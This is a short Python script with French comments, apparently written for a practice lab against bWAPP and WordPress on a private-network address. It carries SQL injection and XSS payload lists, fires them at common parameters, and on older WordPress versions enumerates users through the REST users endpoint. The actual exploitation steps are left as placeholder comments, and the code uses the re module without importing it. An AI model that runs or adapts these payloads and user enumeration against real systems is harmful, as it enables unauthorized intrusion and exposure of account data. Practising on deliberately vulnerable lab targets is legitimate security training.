import requests
from pwn import *
import time

def exploiter_vulnerabilites(url):
    print(f"Exploitation des vulnérabilités pour {url}")

    # Fonction pour tester une injection SQL
    def tester_sql_injection(url, param):
        payloads = ["' OR '1'='1", "' UNION SELECT NULL,NULL,NULL--", "admin' --"]
        for payload in payloads:
            try:
                r = requests.get(f"{url}?{param}={payload}")
                if "error in your SQL syntax" in r.text:
                    print(f"Vulnérabilité SQL Injection détectée avec le payload: {payload}")
                    return True
            except requests.RequestException as e:
                print(f"Erreur lors du test SQL Injection: {e}")
        return False

    # Fonction pour tester une faille XSS
    def tester_xss(url, param):
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        for payload in payloads:
            try:
                r = requests.get(f"{url}?{param}={payload}")
                if payload in r.text:
                    print(f"Vulnérabilité XSS détectée avec le payload: {payload}")
                    return True
            except requests.RequestException as e:
                print(f"Erreur lors du test XSS: {e}")
        return False

    # Test des vulnérabilités
    params = ["username", "password", "search", "id"]
    for param in params:
        if tester_sql_injection(url, param):
            print(f"Tentative d'exploitation de la faille SQL Injection sur le paramètre {param}")
            # Ici, vous pouvez ajouter du code pour exploiter la faille SQL Injection
        
        if tester_xss(url, param):
            print(f"Tentative d'exploitation de la faille XSS sur le paramètre {param}")
            # Ici, vous pouvez ajouter du code pour exploiter la faille XSS

    # Tentative d'exploitation d'une vulnérabilité connue dans WordPress
    if "wordpress" in url.lower():
        try:
            wp_version = requests.get(f"{url}/readme.html").text
            version_match = re.search(r"Version (\d+\.\d+(\.\d+)?)", wp_version)
            if version_match:
                version = version_match.group(1)
                print(f"Version WordPress détectée: {version}")
                if version.startswith("4.") or version.startswith("5.0"):
                    print("Vulnérabilité potentielle : WordPress <= 5.0 - Exposition des utilisateurs")
                    users_endpoint = f"{url}/wp-json/wp/v2/users"
                    users_response = requests.get(users_endpoint)
                    if users_response.status_code == 200:
                        users = users_response.json()
                        print("Utilisateurs exposés:")
                        for user in users:
                            print(f"ID: {user['id']}, Nom: {user['name']}, Rôle: {user['roles']}")
        except requests.RequestException as e:
            print(f"Erreur lors de la vérification de la version WordPress: {e}")

# Exécution de l'exploitation pour BWAPP et WordPress
exploiter_vulnerabilites("http://192.168.136.137/bWAPP")
exploiter_vulnerabilites("http://192.168.136.137/wordpress")

print("L'exploitation des vulnérabilités est terminée.")
